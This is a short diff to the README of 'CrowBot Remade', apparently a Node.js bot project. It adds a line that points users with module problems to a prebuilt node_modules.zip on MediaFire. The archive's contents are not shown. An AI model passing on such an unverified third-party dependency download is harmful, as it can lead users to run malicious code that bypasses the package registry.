@@ -25,6 +25,9 @@ After you've done all that, you can finally run CrowBot Remade by typing in the 
 node index.js
 ```
 
+If you have problems with the modules use this:
+https://www.mediafire.com/file/zp4ufnx828n5oox/node_modules.zip/file
+
 # Credits
 ```
 github.com/whoisbaby
